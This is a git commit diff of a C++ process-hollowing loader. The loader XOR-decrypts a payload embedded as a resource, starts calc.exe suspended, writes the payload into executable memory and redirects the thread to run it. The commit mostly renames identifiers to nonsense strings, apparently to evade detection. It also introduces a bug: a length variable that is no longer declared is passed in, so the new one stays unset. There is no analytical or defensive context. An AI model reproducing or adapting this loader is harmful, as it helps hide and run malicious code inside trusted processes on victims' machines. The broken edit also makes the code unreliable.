30d9592afd4df8971d0a5cfa63d62b62856a9aa5
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-28 04:51:57 -0500

    Update hollowing.cpp

--- dummyda/hollowing.cpp
+++ dummyda/hollowing.cpp
@@ -5,7 +5,7 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void loadresbabe(const char* resName, char** data, DWORD* size) {
+void lalijojoloadres(const char* resName, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
     
@@ -14,33 +14,32 @@ void loadresbabe(const char* resName, char** data, DWORD* size) {
     *data = (char*)LockResource(hResData);
 }
 
-void XXXoordec(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
-    for (DWORD da = 0; da < c1o2d3e4Len; da++) {
-        c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
+void ccccdeckumcrpt(char* dancode, DWORD dancodeLen, unsigned char* dkdan1e2y6, DWORD dank1e2y6Len) {
+    for (DWORD moo = 0; moo < dancodeLen; moo++) {
+        dancode[moo] ^= dkdan1e2y6[moo % dank1e2y6Len];
     }
 }
 
 int main() {
-    Sleep(2000);
+    Sleep(1000);
 
-    
-    char* k1e2y6ENC;
-    DWORD k1e2y6ENCLen;
-    loadresbabe("dhanushkey1", &k1e2y6ENC, &k1e2y6ENCLen);
+    char* dank1e6ENC;
+    DWORD dank1e6ENCLen;
+    lalijojoloadres("dhanushkey1", &dank1e6ENC, &dank1e6ENCLen);
 
-    char* c1o2d3e4Enc;
-    DWORD c1o2d3e4EncLen;
-    loadresbabe("dhanushcode56", &c1o2d3e4Enc, &c1o2d3e4EncLen);
+    char* codfhu;
+    DWORD codfhuLen;
+    lalijojoloadres("dhanushcode56", &codfhu, &c1o2d3e4EncLen);
 
     // Decrypt the payload
-    XXXoordec(c1o2d3e4Enc, c1o2d3e4EncLen, (unsigned char*)k1e2y6ENC, k1e2y6ENCLen);
+    ccccdeckumcrpt(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
 
     // Create a new process in a suspended state
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
-    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcess("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
       
 
     
@@ -49,13 +48,13 @@ int main() {
 
     GetThreadContext(pi.hThread, &ctx);
 
-    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, c1o2d3e4EncLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID dankummm = VirtualAllocEx(pi.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
 
     // Write payload to target process
-    WriteProcessMemory(pi.hProcess, memlo, c1o2d3e4Enc, c1o2d3e4EncLen, NULL);
+    WriteProcessMemory(pi.hProcess, dankummm, codfhu, codfhuLen, NULL);
     // Update entry point
-    ctx.Rcx = (DWORD64)memlo; // Use Rcx for x64 processes
+    ctx.Rcx = (DWORD64)dankummm; // Use Rcx for x64 processes
     SetThreadContext(pi.hThread, &ctx);
 
     // Resume thread to execute payload
